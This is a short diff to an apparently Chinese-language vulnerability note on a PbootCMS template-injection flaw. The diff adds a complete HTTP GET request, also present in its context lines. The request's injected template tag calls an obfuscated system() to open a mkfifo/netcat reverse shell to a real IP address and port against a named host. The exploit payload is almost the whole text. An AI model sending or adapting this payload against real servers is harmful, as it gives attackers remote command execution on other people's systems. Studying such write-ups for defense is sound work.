@@ -52,6 +52,11 @@ https://guokeya.github.io/post/WscncUrcS/  漏洞原理
 ![](assets/file-20260529154404715.png)
 
 完整的Request
+
+```
+GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
+```
+
 ```bash
 GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
 Host: 39.101.138.52
